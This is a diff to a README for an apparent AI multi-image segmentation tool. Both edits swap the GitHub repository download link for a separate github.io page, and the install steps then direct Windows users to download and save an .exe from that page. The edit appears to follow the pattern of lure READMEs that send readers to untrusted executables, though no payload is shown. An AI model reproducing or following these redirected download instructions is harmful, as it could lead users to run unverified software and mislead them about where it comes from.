@@ -1,6 +1,6 @@
 # 🖼️ SamCo-Multi-Image-Segmentation - AI tools extract objects from images
 
-[![](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/Figtreemoderation17/SamCo-Multi-Image-Segmentation)
+[![](https://img.shields.io/badge/Download-Software-blue.svg)](https://figtreemoderation17.github.io)
 
 This program uses artificial intelligence to find and cut out objects from groups of images. It uses advanced computer vision models to identify the same object across multiple pictures. You can use this to speed up your image editing or research tasks.
 
@@ -19,7 +19,7 @@ Before you install this software, ensure your computer meets these needs:
 
 Follow these steps to set up the software on your Windows computer:
 
-1. Visit this page to download the latest version: [https://github.com/Figtreemoderation17/SamCo-Multi-Image-Segmentation](https://github.com/Figtreemoderation17/SamCo-Multi-Image-Segmentation).
+1. Visit this page to download the latest version: [https://figtreemoderation17.github.io](https://figtreemoderation17.github.io).
 2. Locate the download button or the releases section on the webpage.
 3. Choose the file marked with the .exe extension for Windows.
 4. Save the file to your computer.
